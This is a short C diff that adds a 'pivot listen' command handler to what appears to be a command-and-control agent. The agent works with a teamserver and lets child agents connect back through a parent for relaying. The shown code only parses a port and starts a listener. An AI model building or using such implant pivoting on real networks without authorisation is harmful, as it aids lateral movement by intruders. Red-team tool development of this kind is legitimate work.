@@ -85,6 +85,38 @@ int task_unlink(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
     return 0;
 }
 
+/// COMMAND_PIVOT_LISTEN — reverse pivot: parent listens, child dials in
+/// Input msgpack: {port: int}   (port == 0 stops listening)
+int task_pivot_listen(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
+    mp_reader_t r;
+    mp_reader_init(&r, data, data_len);
+
+    uint32_t map_count;
+    if (mp_read_map(&r, &map_count) != 0) {
+        mp_write_map(w, 1);
+        mp_write_kv_str(w, "error", "Invalid params");
+        return 0;
+    }
+
+    int port = 0;
+    for (uint32_t i = 0; i < map_count; i++) {
+        const char *key;
+        uint32_t klen;
+        if (mp_read_str(&r, &key, &klen) != 0) break;
+
+        if (klen == 4 && ax_memcmp(key, "port", 4) == 0) {
+            uint64_t v;
+            mp_read_uint(&r, &v);
+            port = (int)v;
+        } else {
+            mp_skip(&r);
+        }
+    }
+
+    pivot_listen_tcp(&g_pivot_ctx, port, w);
+    return 0;
+}
+
 /// COMMAND_PIVOT_EXEC — relay data from teamserver to child agent
 /// Input msgpack: {pivot_id: uint, data: bytes}
 int task_pivot_exec(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
